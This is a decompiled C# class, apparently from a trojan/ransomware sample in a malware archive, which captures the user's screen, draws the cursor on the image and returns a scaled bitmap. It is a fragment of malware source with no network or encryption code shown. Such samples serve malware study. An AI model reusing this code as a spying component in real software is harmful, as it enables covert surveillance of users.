// Decompiled with JetBrains decompiler
// Type: zthjxratbens.SCIPRNS
// Assembly: zthjxratbens, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E4928766-6934-4945-9130-5EB266E8CD1B
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.05\HEUR-Trojan-Ransom.MSIL.Foreign.gen-33efd821e2484eda83e99247859286a78c16be9deea18bc1e563ad91cb789ea5.exe

using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace zthjxratbens
{
  internal class SCIPRNS
  {
    private const int zthjxratbensCURSOR_SHOWING = 1;

    [DllImport("user32.dll")]
    private static extern bool DrawIcon(IntPtr hDC, int X, int Y, IntPtr hIcon);

    public Bitmap zthjxratbensscreen(int mheight)
    {
      Bitmap original = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format24bppRgb);
      try
      {
        using (Graphics graphics = Graphics.FromImage((Image) original))
        {
          graphics.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
          SCIPRNS.CURSORINFO pci;
          pci.cbSize = Marshal.SizeOf(typeof (SCIPRNS.CURSORINFO));
          if (SCIPRNS.GetCursorInfo(out pci))
          {
            if (pci.flags == 1)
            {
              SCIPRNS.DrawIcon(graphics.GetHdc(), pci.ptScreenPos.x, pci.ptScreenPos.y, pci.hCursor);
              graphics.ReleaseHdc();
            }
          }
        }
      }
      catch
      {
        return (Bitmap) null;
      }
      int height = original.Height * (mheight * 100 / original.Height) / 100;
      int width = mheight + mheight * 100 / original.Width * mheight / 100 + 100;
      return new Bitmap((Image) original, new Size(width, height));
    }

    [DllImport("user32.dll")]
    private static extern bool GetCursorInfo(out SCIPRNS.CURSORINFO pci);

    private struct CURSORINFO
    {
      public int cbSize;
      public int flags;
      public IntPtr hCursor;
      public SCIPRNS.POINTAPI ptScreenPos;
    }

    private struct POINTAPI
    {
      public int x;
      public int y;
    }
  }
}
